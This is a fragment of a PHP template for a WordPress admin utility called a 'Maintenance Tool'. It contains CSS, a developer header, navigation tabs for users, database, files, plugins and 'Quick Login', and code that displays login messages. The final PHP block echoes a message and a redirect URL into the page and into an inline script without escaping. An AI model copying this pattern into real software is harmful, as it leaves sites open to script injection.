        font-size: 16px !important;
    }

    .binary-file-preview {
        text-align: center;
        padding: 40px;
        color: #999;
    }

    .binary-file-preview img {
        max-width: 100%;
        max-height: 400px;
        border-radius: 4px;
        margin-bottom: 15px;
    }

    .file-icon {
        font-size: 48px;
        margin-bottom: 15px;
        color: #ff7e3a;
    }

    /* Smooth scrolling */
    html {
        scroll-behavior: smooth;
    }

    @keyframes fadeIn {
        from {
            opacity: 0;
        }

        to {
            opacity: 1;
        }
    }

    @media (max-width: 768px) {
        .container {
            padding: 15px;
            margin: 10px;
        }

        .nav {
            flex-direction: column;
        }

        .nav a {
            text-align: center;
            border-radius: 3px;
            margin-bottom: 5px;
        }

        table {
            font-size: 14px;
        }

        th,
        td {
            padding: 8px;
        }

        .file-editor-header {
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
        }

        .file-editor-actions {
            width: 100%;
            justify-content: flex-end;
        }
    }
    </style>
    <!-- External CSS loaded above -->
</head>

<body>
    <div class="container">
        <div class="developer-info">
            <div class="developer-logo">
                <img src="https://yasirshabbir.com/wp-content/uploads/2024/01/yasir-shabbir-white-logo-300x300.png"
                    alt="Yasir Shabbir Logo">
                <div>
                    <a href="https://yasirshabbir.com" target="_blank">Yasir Shabbir</a><br>
                    <a href="mailto:contact@yasirshabbir.com">contact@yasirshabbir.com</a>
                </div>
            </div>
            <div>
                v6.0
                <a href="https://github.com/yasirshabbirservices/wp-arzo" target="_blank"
                    style="color: var(--accent-color); text-decoration: none; font-size: 14px; margin-left: 10px;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"
                        style="vertical-align: middle; margin-right: 5px;">
                        <path
                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
                    </svg>
                    GitHub
                </a>
            </div>
        </div>

        <h1>WordPress Maintenance Tool</h1>

        <div class="nav">
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=info'); ?>"
                <?php echo ($action === 'info') ? 'class="active"' : ''; ?>>Site Info</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=users'); ?>"
                <?php echo ($action === 'users') ? 'class="active"' : ''; ?>>Users</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=database'); ?>"
                <?php echo ($action === 'database') ? 'class="active"' : ''; ?>>Database</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=files'); ?>"
                <?php echo ($action === 'files') ? 'class="active"' : ''; ?>>Files</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=plugins'); ?>"
                <?php echo ($action === 'plugins') ? 'class="active"' : ''; ?>>Plugins</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=themes'); ?>"
                <?php echo ($action === 'themes') ? 'class="active"' : ''; ?>>Themes</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=debug'); ?>"
                <?php echo ($action === 'debug') ? 'class="active"' : ''; ?>>Debug</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=maintenance'); ?>"
                <?php echo ($action === 'maintenance') ? 'class="active"' : ''; ?>>Maintenance Modes</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=extra_options'); ?>"
                <?php echo ($action === 'extra_options') ? 'class="active"' : ''; ?>>Extra Options</a>
            <a href="<?php echo admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=login'); ?>"
                <?php echo ($action === 'login') ? 'class="active"' : ''; ?>>Quick Login</a>
        </div>

        <?php
        // Display login messages
        if ($login_message) {
            $message_parts = explode('|', $login_message);
            $message_type = $message_parts[0];
            $message_text = $message_parts[1];
            echo '<div class="' . $message_type . '">' . $message_text . '</div>';
        }

        // Add redirect script if needed
        if ($login_redirect) {
            echo '<script>setTimeout(function() { window.open("' . $login_redirect . '", "_blank"); }, 1000);</script>';
        }
        ?>

